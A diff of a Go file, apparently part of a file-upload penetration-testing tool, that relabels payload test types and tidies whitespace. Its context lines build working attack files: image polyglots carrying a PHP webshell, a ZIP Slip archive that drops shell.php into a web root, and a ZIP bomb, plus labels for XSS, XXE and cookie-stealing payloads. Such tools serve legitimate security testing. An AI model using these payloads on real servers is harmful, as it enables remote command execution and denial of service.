@@ -13,14 +13,14 @@ func moduleF() []*Payload {
 	// F1: GIF+PHP Polyglot (valid GIF + executable PHP)
 	gifHeader := []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!")
 	gifTrailer := []byte("\x00\x3B")
-	
+
 	gifPHPPolyglot := make([]byte, 0)
 	gifPHPPolyglot = append(gifPHPPolyglot, gifHeader...)
 	gifPHPPolyglot = append(gifPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)
 	gifPHPPolyglot = append(gifPHPPolyglot, gifTrailer...)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "GIF+PHP Polyglot (valid GIF + executable PHP webshell)",
 		Filename:  "polyglot_gifphp.gif",
 		Extension: ".gif",
@@ -35,7 +35,7 @@ func moduleF() []*Payload {
 	pngPHPPolyglot = append(pngPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "PNG+PHP Polyglot (PNG header + PHP webshell)",
 		Filename:  "polyglot_pngphp.png",
 		Extension: ".png",
@@ -50,7 +50,7 @@ func moduleF() []*Payload {
 	jpegPHPPolyglot = append(jpegPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "JPEG+PHP Polyglot (JPEG header + PHP webshell)",
 		Filename:  "polyglot_jpegphp.jpg",
 		Extension: ".jpg",
@@ -65,7 +65,7 @@ func moduleF() []*Payload {
 `)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "GIF+PHP+JS Polyglot (triple format: GIF image, PHP shell, XSS payload)",
 		Filename:  "triple_polyglot.gif",
 		Extension: ".gif",
@@ -86,7 +86,7 @@ func moduleF() []*Payload {
 </svg>`)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "SVG file with embedded XSS (stored XSS via file upload)",
 		Filename:  "xss_vector.svg",
 		Extension: ".svg",
@@ -104,7 +104,7 @@ func moduleF() []*Payload {
 </svg>`)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "SVG file with XXE (XML External Entity - reads /etc/passwd)",
 		Filename:  "xxe_attack.svg",
 		Extension: ".svg",
@@ -115,7 +115,7 @@ func moduleF() []*Payload {
 	// F6: ZIP file with webshell inside (ZIP slip attack)
 	zipPayload := createZIPWithPHPWebshell("../../../var/www/html/shell.php")
 	tests = append(tests, &Payload{
-		TestType:  TestTypePathTraversal,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "ZIP file with PHP webshell using path traversal (ZIP Slip attack)",
 		Filename:  "zip_slip_attack.zip",
 		Extension: ".zip",
@@ -126,7 +126,7 @@ func moduleF() []*Payload {
 	// F7: Simple ZIP bomb (compressed DoS)
 	zipBomb := createZIPBomb(1024 * 100) // 100KB -> expands to 100MB
 	tests = append(tests, &Payload{
-		TestType:  TestTypeExtensionEvasion,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "ZIP Bomb (100KB compressed -> 100MB uncompressed) - DoS test",
 		Filename:  "zip_bomb.zip",
 		Extension: ".zip",
@@ -147,10 +147,10 @@ endobj
 endobj
 xref
 0 4
-0000000000 65535 f 
-0000000009 00000 n 
-0000000125 00000 n 
-0000000192 00000 n 
+0000000000 65535 f
+0000000009 00000 n
+0000000125 00000 n
+0000000192 00000 n
 trailer
 << /Size 4 /Root 1 0 R >>
 startxref
@@ -158,7 +158,7 @@ startxref
 %%EOF`)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "PDF with embedded JavaScript (stored XSS via PDF upload)",
 		Filename:  "malicious_document.pdf",
 		Extension: ".pdf",
@@ -184,7 +184,7 @@ startxref
 </html>`)
 
 	tests = append(tests, &Payload{
-		TestType:  TestTypeExtensionEvasion,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "HTML file with cookie stealing and phishing redirect",
 		Filename:  "phishing_page.html",
 		Extension: ".html",
@@ -195,7 +195,7 @@ startxref
 	// F10: WebP/AVIF with polyglot payloads (modern image formats)
 	webpPayload := createWebPPolyglot()
 	tests = append(tests, &Payload{
-		TestType:  TestTypeMagicByteSpoof,
+		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
 		Technique: "WebP image with PHP polyglot payload",
 		Filename:  "polyglot_image.webp",
 		Extension: ".webp",
@@ -209,12 +209,9 @@ startxref
 // createZIPWithPHPWebshell creates a minimal ZIP file containing a PHP webshell
 // with path traversal in the filename (ZIP Slip attack)
 func createZIPWithPHPWebshell(targetPath string) []byte {
-	// Minimal ZIP file structure:
-	// Local file header + File data + Central directory + End of central directory
-	
 	filename := targetPath
 	fileContent := phpWebshell
-	
+
 	// Local file header
 	localHeader := []byte{0x50, 0x4B, 0x03, 0x04} // Signature
 	localHeader = append(localHeader, []byte{0x14, 0x00}...) // Version needed
@@ -231,7 +228,7 @@ func createZIPWithPHPWebshell(targetPath string) []byte {
 	localHeader = append(localHeader, []byte{0x00, 0x00}...) // Extra field length
 	localHeader = append(localHeader, []byte(filename)...)
 	localHeader = append(localHeader, fileContent...)
-	
+
 	// Central directory
 	centralDir := []byte{0x50, 0x4B, 0x01, 0x02}
 	centralDir = append(centralDir, []byte{0x14, 0x00, 0x14, 0x00}...)
@@ -249,7 +246,7 @@ func createZIPWithPHPWebshell(targetPath string) []byte {
 	offset := uint32ToBytes(0)
 	centralDir = append(centralDir, offset...)
 	centralDir = append(centralDir, []byte(filename)...)
-	
+
 	// End of central directory
 	endDir := []byte{0x50, 0x4B, 0x05, 0x06}
 	endDir = append(endDir, []byte{0x00, 0x00}...) // Disk number
@@ -261,23 +258,20 @@ func createZIPWithPHPWebshell(targetPath string) []byte {
 	centralDirOffset := uint32ToBytes(uint32(len(localHeader)))
 	endDir = append(endDir, centralDirOffset...)
 	endDir = append(endDir, []byte{0x00, 0x00}...) // Comment length
-	
+
 	// Combine all parts
 	zip := make([]byte, 0)
 	zip = append(zip, localHeader...)
 	zip = append(zip, centralDir...)
 	zip = append(zip, endDir...)
-	
+
 	return zip
 }
 
 // createZIPBomb creates a minimal ZIP bomb
 func createZIPBomb(targetSize int) []byte {
-	// Create a ZIP with highly compressible data
 	zeros := bytes.Repeat([]byte{0}, targetSize)
-	
-	// Minimal ZIP structure with deflate compression
-	// Simplified version - stores data with deflate
+
 	zip := make([]byte, 0)
 	zip = append(zip, 0x50, 0x4B, 0x03, 0x04) // Signature
 	zip = append(zip, 0x14, 0x00) // Version
@@ -291,13 +285,12 @@ func createZIPBomb(targetSize int) []byte {
 	zip = append(zip, 0x00, 0x00) // Extra
 	zip = append(zip, []byte("zero.txt")...)
 	zip = append(zip, zeros...)
-	
+
 	return zip
 }
 
 // createWebPPolyglot creates a WebP image with PHP payload
 func createWebPPolyglot() []byte {
-	// WebP RIFF header + PHP code
 	webp := []byte("RIFF")
 	webp = append(webp, []byte{0x00, 0x00, 0x00, 0x00}...) // Size placeholder
 	webp = append(webp, []byte("WEBP")...)
@@ -323,7 +316,6 @@ func uint16ToBytes(v uint16) []byte {
 }
 
 func calculateCRC32(data []byte) []byte {
-	// Simple CRC32 implementation
 	crc := uint32(0xFFFFFFFF)
 	for _, b := range data {
 		crc ^= uint32(b)
